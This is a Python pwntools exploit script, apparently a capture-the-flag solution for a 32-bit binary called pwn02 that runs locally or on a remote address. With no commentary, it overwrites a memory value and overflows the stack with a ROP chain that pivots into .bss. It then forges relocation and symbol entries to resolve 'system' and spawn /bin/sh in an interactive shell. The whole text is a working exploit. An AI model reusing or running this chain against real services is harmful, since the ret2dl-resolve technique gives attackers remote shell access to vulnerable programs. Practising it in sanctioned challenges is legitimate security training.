import sys
from pwn import *

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwn02")
#	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn02")
else:
	p = remote("172.16.2.14","10002")
#	libc = ELF("./libc.so")
	elf = ELF("./pwn02")

def debugf():
	if debug:
		gdb.attach(p,"b *0x080486AD")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
target = 0x0804A040
value = 0x10000000
offset = 0x20
vulFunc = 0x0804864B
debugf()
p.sendlineafter("Which number do you want to get for the first time?\n",str(target))
p.sendlineafter("Which number do you want to get the second time?\n",str(value))
payload = "\x00" * 0x20
p3_ret = 0x08048989
bss_addr = 0x0804Ad00
ebp = 0x0804898b
leave = 0x080485b8
payload += p32(elf.plt["read"]) + p32(p3_ret) + p32(0) + p32(bss_addr) + p32(0x100)
payload += p32(ebp) + p32(bss_addr) + p32(leave)
payload = payload.ljust(0x100,"\x00")

p.sendafter("I won't let you PUTS to bypass ASLR\n",payload)
cmd = "/bin/sh"
plt_0 = 0x08048480
read_index = 8
index_base = 0x08048404
index_offset = (bss_addr + 0x20) - index_base
fake_reloc = p32(elf.got["read"]) + p32(0x207)
st_name = 0x4e
dynsym = 0x080481DC
fake_sym_addr = bss_addr + 0x30
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dymsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dymsym << 8) | 0x7
fake_reloc = p32(elf.got["read"]) + p32(r_info)
st_name_base = 0x080482EC
name_index = (bss_addr+0x90) - st_name_base
fake_sym = p32(name_index) + p32(0) + p32(0) + p32(0x12)

payload2 = "AAAA" + p32(plt_0) + p32(index_offset)
payload2 += "junk" + p32(bss_addr + 0x80)
payload2 = payload2.ljust(0x20,"\x00")
payload2 += fake_reloc
payload2 = payload2.ljust(0x30,"\x00")
payload2 += "\x00" * align
payload2 += fake_sym
payload2 = payload2.ljust(0x80,"\x00")
payload2 += cmd + "\x00"
payload2 = payload2.ljust(0x90,"\x00")
payload2 += "system"
payload2.ljust(0x100,"\x00")
p.send(payload2)

p.interactive()
